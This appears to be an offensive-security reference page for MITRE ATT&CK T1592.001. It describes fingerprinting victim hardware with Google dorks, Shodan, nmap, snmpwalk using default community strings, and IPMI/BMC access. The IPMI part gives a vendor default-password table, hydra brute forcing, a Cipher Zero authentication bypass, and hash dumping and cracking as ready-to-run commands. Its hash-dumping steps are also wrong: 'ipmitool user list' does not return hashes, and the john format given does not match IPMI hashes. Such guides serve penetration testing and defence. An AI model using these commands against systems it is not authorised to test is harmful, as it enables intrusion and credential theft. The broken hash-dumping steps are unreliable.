# T1592 Gather Victim Host Information

## T1592.001 Hardware

A number of techniques can be used to grab victim host hardware information from an external recon position

### T1592.001 Procedure

#### Public Asset Inventory

Review public documentation and websites that may expose hardware inventories on websites such as Github, Gitlab or IT management portals. 

Google dorks can be used to search for leaked data, which may include hardware assets:

```shell
site:company.com inurl:inventory
site:company.com filetype:xlsx hardware
```

Websites like shodan and Censys can be used to search devices/IP addresses/domains related to an organisation and can footprint devices, often providing insights into Makes/Models/Versons:

![image](https://github.com/user-attachments/assets/ba35ba12-5589-4301-ae5c-c0c135a7addc)

#### Network Footprinting

Network footprinting using tools like `nmap` for banner grabbing or `snmpwalk` often gives information on the underlying hardware and technology in use.

##### Nmap Banner Granning

Nmap can be used to grab the "banners" from ports, which may indicate what technologies or hardware is in use:

```shell
nmap -sS -sV --script=banner -p <port> <IP>
```

The banner may leak hardware information, such as Make/Model/Serial number.

##### Simple Network Management Protocol (SNMP) Port: 161/UDP

The Simple Network Management Prococol (SNMP) operates on UDP port 161 and can give extremely detailed information about a device and its running configuration. A common misconfiguration for SNMP is having the Read/Write or Read-Only community string(s) set to the default values:

```shell
Read-Only Community String: public
Read/Write Community String: private
```

If the device uses the default community strings along with SNMP version 1 or v2c, it is possible to dump configuration data from the device. This can include Make/Model/Serial Number/Network Interfaces and much more.

To use snmpwalk on a Linux system such as Kali Linux, install SNMP Mibs using:

```shell
sudo apt update
sudo apt install snmp snmp-mibs-downloader -y
sudo download-mibs
```

Once the SNMP mibs are installed the tool `snmpwalk` can be used to query SNMP over port 161/UDP to reveal critical system information. 

snmpwalk command explanation:

```shell
-v 1: SNMP version 1.
-c public: Community string (public). Or -c "private" for private.
192.168.1.10: Target device IP.
system: Fetch system information OID (e.g., system description, uptime, etc.).
```

Example 1: SNMP Version 1 (Public Community String)

```shell
snmpwalk -v 1 -c public 192.168.1.10 system
```

Example 2: SNMP Version 1 (Private Community String)

```shell
snmpwalk -v 1 -c private 192.168.1.10 system
```

Example 3: SNMP Version 2c (public Community String)

```shell
snmpwalk -v 2c -c public 192.168.1.10 system
```

Example 4: SNMP Version 2c (private Community String)

```shell
snmpwalk -v 2c -c private 192.168.1.10 system
```

#### IPMI & BMC Interfaces

IPMI (Intelligent Platform Management Interface) and BMC (Baseboard Management Controller) allow out-of-band management of servers and hardware, often used for remote monitoring, rebooting, and troubleshooting. These systems are attractive targets because misconfigurations or default credentials can expose detailed hardware information and even control over the hardware.

IPMI or BMC interfaces typically run on ports 623/UDP and 664/TCP

Nmap can be used to scan for and detect the IPMI version running:

```shell
nmap -sU -p 623 --script=ipmi-version <target_ip>
```

The `ipmi-version` nse script will sometimes give a Manufacturer ID, Product ID and Device ID as part of the response:

```shell
PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   IPMI Version: 2.0
|   Manufacturer ID: 47488 (Dell)
|   Product ID: 32
|_  Device ID: 0
```

IPMI or BMC commonly expose web servers or SSH for accessing teh device, which can be enumerated using `nmap`:

```
sudo nmap -sS -sV -sC -p 22,80,443,623,664 <target_ip>
```

##### Enumerating IPMI Data with `ipmitool`

Once IPMI/BNC systems are identified, `ipmitool` can be used to interact with them

Installing `ipmitool` in Linux:

```bash
sudo apt update
sudo apt install ipmitool -y
```

Basic Usage:

```bash
ipmitool -I lanplus -H <target_ip> -U <username> -P <password> chassis status
```

Command Overview:

* -I lanplus: Use LAN interface (IPMI 2.0).
* -H <target_ip>: Target IP address.
* -U <username> and -P <password>: Credentials (try defaults like admin/admin).

The most common way of exploiting IPMI/BMC interfaces is attempting to use common passwords against the device. If nmap has fingerprinted the device, attempt the username/password combinations from the list below:

| **Username**      | **Password**     | **Device/Brand**                   |
|--------------------|------------------|-------------------------------------|
| `admin`           | `admin`          | Generic/default                     |
| `admin`           | `password`       | Generic/default                     |
| `ADMIN`           | `ADMIN`          | Generic/default (case-sensitive)    |
| `root`            | `calvin`         | Dell iDRAC                          |
| `Administrator`   | `password`       | HP iLO                              |
| `root`            | `superuser`      | Supermicro IPMI                     |
| `ADMIN`           | `PASS`           | Fujitsu iRMC                        |
| `root`            | `root`           | Generic/default                     |
| `admin`           | `0000`           | Generic/default                     |
| `admin`           | `1234`           | Generic/default                     |
| `admin`           | `changeme`       | Cisco UCS/IPMI                      |
| `admin`           | `huawei`         | Huawei iBMC                         |
| `admin`           | `!admin`         | Lenovo XClarity Controller (XCC)    |
| `ADMIN`           | `12345`          | Asus ASMB                           |
| `root`            | `toor`           | Some legacy systems                 |

To query system information using the `fru` command:

```bash
ipmitool -I lanplus -H <target_ip> -U <username> -P <password> fru
```

The command retrieves the "Field Replaceable Unit" (FRU) information, which may contain hardware details such as:

* Manufacturer
* Model
* Serial Numbers

List all sensor information:

```bash
ipmitool -I lanplus -H <target_ip> -U <username> -P <password> sensor
```

Some IPMI interfaces allow the dumping of the System Event Log (SEL), which may contain hardware faults or configuration details:

```bash
ipmitool -I lanplus -H <target_ip> -U <username> -P <password> sel list
```

##### Bruteforcing IPMI/BMC Credentials Hydra

The tool `hydra` within Kali Linux and other distros can be used to bruteforce the username and password used to login to the system. Specifying `-L` for a list of usernames in a text file and `-P` for a list of passwords in a text file:

```bash
hydra -L usernames.txt -P passwords.txt <target_ip> ipmi
```

##### IPMI Cypher 0 Authentication Bypass

Some IPMI implementations allow "Cipher Zero," which permits authentication without a password.

Nmap can detect IPMI/BMC devices that are vulnerable using the `ipmi-cipher-zero` script:

```bash
nmap --script ipmi-cipher-zero -p 623 <target_ip>
```

If vulnerable, it can be exploited using `ipmitool`, by supplying `-C 0` as part of the command line arguments, which tells it to use Cypher 0:

```bash
ipmitool -I lanplus -C 0 -H <target_ip> -U <username> chassis status
```

##### Dumping Password Hashes `ipmitool`

IPMI allows dumping password hashes (e.g., for user root). These hashes can be cracked offline.

* ipmitool to dump hashes:

```bash
ipmitool -I lanplus -H <target_ip> -U <username> -P <password> user list
```

The tool johntheripper can be used to crack the hashes, copying the hashes into a file:

```bash
john --format=raw-sha1 hashfile.txt --wordlist=/path/to/password/list.txt
```

 #### IPMI/BMC Known CVE's

* CVE-2018-10072: Authentication bypass in Supermicro BMC.
* CVE-2019-6260: ASPEED AST2400/AST2500 BMC SoC arbitrary code execution.
* CVE-2021-26722: HP iLO 4 remote code execution.
* CVE-2013-4786: Supermicro IPMI RCE (Metasploit Module Available)


